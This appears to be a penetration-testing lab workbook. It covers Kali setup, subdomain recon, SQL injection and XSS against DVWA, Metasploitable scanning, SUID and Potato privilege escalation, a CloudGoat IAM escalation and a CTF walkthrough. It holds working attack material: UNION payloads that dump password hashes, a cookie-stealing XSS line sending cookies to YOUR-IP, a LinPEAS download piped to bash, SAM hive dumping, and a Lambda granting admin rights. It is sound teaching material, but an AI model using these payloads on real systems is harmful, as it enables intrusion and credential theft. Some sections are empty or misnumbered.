🏗️ Lab 1 — Setting Up Your Pentest Lab (90 minutes)

Exercise 1.1: Install Kali Linux on VirtualBox

📋 Objective

Have a fully working Kali Linux VM that can run vulnerable targets and tools.

⏱ Time Estimate

60 minutes.

📝 Prerequisites

  • Computer with virtualization (Intel VT-x / AMD-V) enabled
  • 20 GB free disk space
  • 8 GB RAM minimum

🎬 Steps

  1. Download VirtualBox from virtualbox.org
  2. Download Kali Linux ISO/OVA from kali.org/get-kali
  3. Open VirtualBox → New VM:
    • Name: Kali-Pentest
    • Type: Linux, Debian (64-bit)
    • RAM: 4096 MB
    • Disk: 80 GB dynamically allocated

🔬 Configure the VM

# Inside the VM, after installation:
# Login: root / toor (default)

# Update
$ apt update && apt full-upgrade -y

# Install additional tools we'll use throughout
$ apt install -y \
  nmap metasploit-framework burpsuite wireshark jq \
  ffuf wfuzz gobuster nuclei sqlmap hydra john hashcat \
  bloodhound neo4j crackmapexec evil-winrm mimikatz \
  responder frida-tools objection apktool jadx mobsf

# Create non-root user (best practice)
$ adduser pentester
$ usermod -aG sudo pentester

# Switch to pentester
$ su pentester

# Test nmap
$ nmap -sn 192.168.1.1
# Should scan successfully

📋 Verification

  • Kali boots without errors
  • Network connectivity works (ping 8.8.8.8)
  • All packages installed (no errors)
  • nmap can scan successfully
  • Burp Suite launches

🔍 Lab 2 — Reconnaissance Labs

Exercise 2.1: Passive Subdomain Enumeration (15 min)

📋 Objective

Find ALL subdomains of a target without directly probing.

🎬 Steps

# Step 1: Certificate Transparency
$ curl -s 'https://crt.sh/?q=%25example.com&output=json' | jq -r '.[].name_value' | sort -u

# Step 2: Subfinder (passive DNS)
$ apt install -y subfinder
$ subfinder -d example.com -silent

# Step 3: Amass (passive)
$ apt install -y amass
$ amass enum -passive -d example.com

# Step 4: Combine results
$ (curl -s 'https://crt.sh/?q=%25example.com&output=json' | jq -r '.[].name_value';
   subfinder -d example.com -silent;
   amass enum -passive -d example.com 2>/dev/null) | sort -u > subs.txt
$ wc -l subs.txt

# Compare: see how various tools find different things.

📋 Answer / Findings

You'll find subdomains like www, mail, blog, often dev, staging, internal. Each tool finds different ones — that's why we use multiple.

Exercise 2.2: Live Host Detection (15 min)

📋 Objective

Determine which found subdomains actually serve HTTP/HTTPS.

# Method 1: httpx
$ cat subs.txt | httpx -status-code -silent -o live.txt
$ cat live.txt

# Method 2: dnsx + httpx
$ cat subs.txt | dnsx -resp | httpx -status-code

# Method 3: nmap HTTP probing
$ nmap -iL subs.txt -p 80,443 -sV --open

🌐 Lab 3 — Web Application Testing Labs

Exercise 3.1: Basic SQL Injection on DVWA (30 min)

📋 Objective

Find and exploit a SQL injection in DVWA's "SQL Injection" page.

🎬 Steps

  1. Login to DVWA: http://localhost:8080/login.php
    Username: admin, Password: password
  2. Set Security Level to "low": http://localhost:8080/security.php
  3. Go to SQL Injection page
  4. Enter a User ID: 1 → see admin first name & surname (normal)
  5. Test with: 1' OR '1'='1 → all users shown
  6. Determine columns: 1' ORDER BY 1--, 1' ORDER BY 2--, 1' ORDER BY 3-- (last one fails → 2 columns)
  7. UNION attack: ' UNION SELECT user(), database()--
  8. List tables: ' UNION SELECT table_name, NULL FROM information_schema.tables--
  9. List passwords: ' UNION SELECT user, password FROM users--

📋 Final Answer

You should see hashes like 5f4dcc3b5aa765d61d8327deb882cf99

# Crack with hashcat or john
$ hashcat -m 0 hashes.txt rockyou.txt
# Or
$ john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Common finds: "admin", "password", "letmein"

Exercise 3.2: Stored XSS on DVWA (20 min)

🎬 Steps

  1. DVWA security → low

  3. In Name field: <script>alert('XSS')</script>
  4. Message: test
  5. Click "Sign Guestbook"

📋 Variation: Cookie-stealing payload

# Start a listener

# XSS payload:
<script>new Image().src='http://YOUR-IP:8888/?c='+document.cookie</script>

🛜 Lab 4 — Network Exploitation Labs

Exercise 4.1: Network Discovery & Service Enumeration (45 min)

🎬 Steps

# Setup Metasploitable 2 as target (download OVA from SourceForge)
# Or use docker:
$ docker run -d --rm -p 21:21 -p 22:22 -p 23:23 -p 25:25 \
   -p 80:80 -p 135:135 -p 139:139 -p 445:445 -p 3306:3306 \
   --name metasploitable vulnerables/metasploit2

# Get its IP
$ TARGET=$(docker inspect metasploitable | jq -r '.[0].NetworkSettings.IPAddress')
echo "Target: $TARGET"

# Discovery
$ nmap -sn 192.168.1.0/24     # Find live hosts (target on this subnet)

# Service scan
$ nmap -sV -p 21,22,23,25,80,135,139,445,3306 $TARGET

# Comprehensive
$ nmap -sV -p- --script=default,vuln $TARGET

# Vulnerable service tests
$ nmap -p 21 --script=ftp-anon $TARGET
$ nmap -p 22 --script=ssh-hostkey $TARGET
$ nmap -p 445 --script=smb-vuln-ms17-010 $TARGET

# Document findings

📋 Answer

  • Multiple vulnerable services: vsftpd 2.3.4 backdoor, Samba 3.0.20
  • SMB vulnerable to MS17-010 (EternalBlue) → RCE possible
  • FTP anonymous login
  • Documentation in: $HOME/pentest-evidence/Metasploit2/

Exercise 4.2: Exploit EternalBlue on Metasploitable (30 min)

⬆ Lab 5 — Privilege Escalation Labs

Exercise 5.1: Linux SUID Privilege Escalation (30 min)

📋 Setup: Vulnerable Linux VM

# Use Lin.Security (lab) or DVWA
$ docker run -d --name lins -p 2222:22 vulnerables/lins
$ ssh -p 2222 user@localhost   # password: user/user

# Inside the box
$ id
$ find / -perm -u=s -type f 2>/dev/null
# /usr/bin/python3 ← SUID!
# /usr/bin/find
# /usr/bin/vim

# Check our user
$ whoami

🎬 Steps: Escalate to root

# Method 1: Python SUID
$ python3 -c 'import os; os.execvp("/bin/sh", ["sh"])'
# We are root via SUID
$ whoami
# root 💪

# Method 2: find with exec
$ find / -name anything -exec /bin/sh \;

# Method 3: vim with shell
$ vim -c ':!/bin/sh'

# Method 4: LinPEAS sweep
$ curl http://your-kali/linspeas.sh | bash
# Identify other escalation paths

Exercise 5.2: Windows Privilege Escalation via Potato (45 min)

📋 Setup

# Use Metasploitable 3 (Windows) in lab
$ docker run -d --name winbox -p 3389:3389 vulnerables/metasploit3
$ docker exec winbox net user pentester /add
$ docker exec winbox net localgroup administrators pentester /add
# Default password: password

# RDP from Kali
$ rdesktop -u pentester -p password winbox.local

# Inside: open cmd.exe as STARTED USER (no admin)

🎬 Privilege Escalation

# Check current privileges
PS> whoami /priv
# Note: SeImpersonatePrivilege = Enabled (must have it!)

# PrintSpoofer
PS> iwr http://kali/PrintSpoofer64.exe -OutFile ps.exe
PS> .\ps.exe -i -c cmd
# We get nt authority\system shell

# Alternate: SweetPotato
PS> iwr http://kali/SweetPotato.exe -OutFile sp.exe
PS> .\sp.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# nt authority\system

# Now you can:
PS> reg save HKLM\SAM sam.hive
PS> reg save HKLM\SYSTEM system.hive
$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL

Exercise 6.2: CloudGoat — IAM Privilege Escalation

📋 Setup

# Install CloudGoat (a vulnerable AWS setup)
$ git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
$ cd cloudgoat
$ pip install -r requirements.txt
$ python3 cloudgoat.py create iam_privesc_by_rollback

# Configuration:
# - Set AWS keys for your test account
# - It deploys vulnerable IAM roles
# - Goal: Start as low-prives user; escalate to admin

# Get credentials from CloudGoat output
$ python3 cloudgoat.py describe iam_privesc_by_rollback

🎬 Solution

# Step 1: Configure with starter creds
$ export AWS_ACCESS_KEY_ID=...
$ export AWS_SECRET_ACCESS_KEY=...

# Step 2: Discover roles
$ aws sts get-caller-identity
$ aws iam list-roles

# Step 3: Trigger lambda with parameter that escalates
$ aws lambda update-function-code --function-name "escape_lambda" --zip-file fileb://./evil.py

# evil.py:
def handler(event, context):
    import boto3
    iam = boto3.client('iam')
    iam.attach_user_policy(UserName='target_user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return "Pwned!"

$ aws lambda invoke --function-name escape_lambda /dev/stdout
# Now you have admin on go-forward

🚩 Lab 10 — Capture-the-Flag Walkthrough Examples

Exercise 10.1: A Realistic CTF (90 min)

Below is a fictional CTF that combines everything we've learned. Try to complete without looking at the answer section.

🎯 Mission: "Expose It"

You've been given a target: ctf.example.com (fictional).
Your goal: capture the flag (CTF{...}) hidden somewhere in the system.

📋 Hints Available (use as needed)

  • Hint 1: The flag is in the database.
  • Hint 2: The endpoint for the search page is at /search.
  • Hint 3: There's a way to access admin functionality without admin creds.
  • Hint 4: UNION SELECT works.

📋 Suggested Walk-Through

# Step 1: Recon
$ nmap -sV ctf.example.com
# Found: nginx 1.24, PHP 7.4, MySQL

$ whatweb ctf.example.com
# Found: jQuery 1.6.2, Bootstrap 4

# Step 2: Test login / registration
$ curl -c cookies.txt -d 'username=test&password=test' http://ctf.example.com/login
# Got session cookie

# Step 3: Test search page for SQL injection
$ curl -b cookies.txt 'http://ctf.example.com/search?q=phone'
# Returns products

# Try malicious:
$ curl -b cookies.txt 'http://ctf.example.com/search?q=phone%27'
# → Error: SQL syntax
# SQLi confirmed!

# Step 4: UNION attack to dump database
$ curl -b cookies.txt "http://ctf.example.com/search?q=' UNION SELECT table_name, NULL FROM information_schema.tables--"
# → Contains tables including 'flags'

# Step 5: Dump flags table
$ curl -b cookies.txt "http://ctf.example.com/search?q=' UNION SELECT flag_value, NULL FROM flags--"
# → Got CTF{...}!

# Answer: CTF{you_hacked_it}

📍 Bonus Variations to Try

  • Use sqlmap instead of manual UNION
  • Try Boolean-based blind SQLi
  • Use time-based if no output
  • Combine with finding admin via misconfiguration
